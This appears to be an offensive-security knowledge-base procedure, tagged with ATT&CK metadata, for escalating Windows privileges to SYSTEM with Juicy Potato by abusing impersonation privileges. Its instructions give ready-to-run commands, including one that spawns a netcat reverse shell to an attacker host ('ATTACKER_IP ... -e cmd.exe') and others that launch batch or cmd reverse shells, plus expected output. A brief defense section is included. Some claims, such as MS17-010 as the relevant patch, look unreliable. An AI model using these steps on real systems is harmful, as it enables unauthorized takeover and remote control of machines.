---
type: procedure
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - >-
    [[techniques/Abuse Elevation Control Mechanism|T1548 - Abuse Elevation
    Control Mechanism]]
  - >-
    [[techniques/Exploitation for Privilege Escalation|T1068 - Exploitation for
    Privilege Escalation]]
sub_techniques:
  - >-
    [[sub-techniques/Bypass User Account Control|T1548.002 - Bypass User Account
    Control]]
tags:
  - EoP - Impersonation Privileges
  - Juicy Potato
  - Windows - Privilege Escalation
commands:
  - '[[commands/whoami-check-privileges]]'
  - '[[commands/juicy-potato-nc-reverse-shell-clsid-b91d5831]]'
  - '[[commands/juicy-potato-rev-bat-clsid-e60687f7]]'
  - '[[commands/juicy-potato-cmd-reverse-shell-clsid-f7fd3fd6]]'
tools:
  - '[[tools/Juicy-Potato]]'
platforms:
  - Windows
skill_level: intermediate
impact_level: high
detection_risk: high
verified: true
validated: true
---

# Abusing Golden Privileges with Juicy Potato

## Summary

This procedure exploits the SeImpersonatePrivilege and SeAssignPrimaryTokenPrivilege on Windows systems to escalate from a medium-integrity process to SYSTEM privileges using the Juicy Potato tool. It automates the creation of a fake service via DCOM impersonation to bypass elevation controls, allowing execution of arbitrary commands as NT AUTHORITY\SYSTEM. Applicable to Windows 7 through 10 on unpatched systems.

## Description

Juicy Potato leverages Windows' handling of service accounts and DCOM objects to impersonate high-privileged tokens. When a process with SeImpersonatePrivilege (common in services like IIS or SQL Server) runs the tool, it requests a token from a specified CLSID (COM class ID), creates a local listener, and uses the impersonated token to spawn a new process with SYSTEM privileges. This bypasses UAC prompts and other elevation mechanisms by tricking the system into assigning primary tokens. The technique targets vulnerable CLSIDs that allow anonymous activation and pipe impersonation. Success depends on the target having the required privileges and an unpatched system (patched in later Windows updates). Once escalated, attackers can access restricted files, install persistence, or exfiltrate data.

## Requirements

1. Local access to a Windows system (Windows 7-10) running as a user or service with SeImpersonatePrivilege and SeAssignPrimaryTokenPrivilege (e.g., via IIS app pool or scheduled task).
2. Juicy Potato executable downloaded and placed on the target (e.g., in a writable directory like %TEMP%).
3. Target process path and arguments prepared (e.g., cmd.exe, nc.exe for reverse shells).
4. Knowledge of working CLSIDs (e.g., {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} for WebClient service).

## Defense

- Apply Windows patches (e.g., MS17-010 and later updates that restrict CLSID activation).
- Monitor for anomalous DCOM activations and pipe creations using Event ID 5156 (Windows Filtering Platform) or Sysmon logs for process token changes.
- Restrict SeImpersonatePrivilege to necessary services only via Group Policy.
- Enable UAC with secure desktop and audit privilege use (Event ID 4673/4674).

## Objectives

1. Verify possession of required impersonation privileges.
2. Escalate to SYSTEM privileges via DCOM token manipulation.
3. Execute arbitrary commands or payloads as NT AUTHORITY\SYSTEM for persistence or data access.

## Instructions

### Step 1: Verify Required Privileges

**Context**: Before attempting escalation, confirm the current token has SeImpersonatePrivilege and SeAssignPrimaryTokenPrivilege enabled, as these are essential for the impersonation attack. Run this from an elevated command prompt or PowerShell.

**Command** ([[commands/whoami-check-privileges]]):
```cmd
whoami /priv
```

> This lists all privileges for the current user. Look for 'SeImpersonatePrivilege' and 'SeAssignPrimaryTokenPrivilege' with 'Enabled' status. If disabled, the exploit will fail; consider alternative escalation paths.

### Step 2: Execute Privilege Escalation with Juicy Potato

**Context**: Download and run JuicyPotato.exe with a vulnerable CLSID, local port, target process, and arguments. The tool tests the CLSID, impersonates the token, and spawns the process. Use variations based on available payloads (e.g., netcat for reverse shell or batch file). Ensure a listener is set up if using reverse shells. Common CLSIDs include those for WebClient or ShellWindows.

**Command** ([[commands/juicy-potato-nc-reverse-shell-clsid-b91d5831]]):
```cmd
JuicyPotato.exe -l 9999 -p $_PROCESS_PATH -a "$_ARGUMENTS" -t $_TOKEN_TYPE -c {B91D5831-B1BD-4608-8198-D72E155020F7}
```

> Example for netcat reverse shell: Set $_PROCESS_PATH to path of nc.exe, $_ARGUMENTS to "ATTACKER_IP ATTACKER_PORT -e cmd.exe". Expected output includes "[+] authresult 0" and "NT AUTHORITY\SYSTEM" if successful, followed by the spawned process connecting back.

**Command** ([[commands/juicy-potato-rev-bat-clsid-e60687f7]]):
```cmd
JuicyPotato.exe -l 1340 -p $_PROCESS_PATH -t $_TOKEN_TYPE -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
```

> Example for batch reverse shell: Set $_PROCESS_PATH to rev.bat containing reverse shell commands. Expected output shows successful token creation and process launch under SYSTEM.

**Command** ([[commands/juicy-potato-cmd-reverse-shell-clsid-f7fd3fd6]]):
```cmd
JuicyPotato.exe -l 1337 -p $_PROCESS_PATH -t $_TOKEN_TYPE -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -a "$_ARGUMENTS"
```

> Example for cmd spawning reverse shell: Set $_PROCESS_PATH to c:\Windows\System32\cmd.exe, $_ARGUMENTS to "/c $_REVERSE_SHELL_PATH". Expected output: "Testing {F7FD3FD6-...} 1337", "[+] authresult 0", "{F7FD3FD6-...};NT AUTHORITY\SYSTEM", "[+] CreateProcessWithTokenW OK". Verify by checking the new process in Task Manager running as SYSTEM.
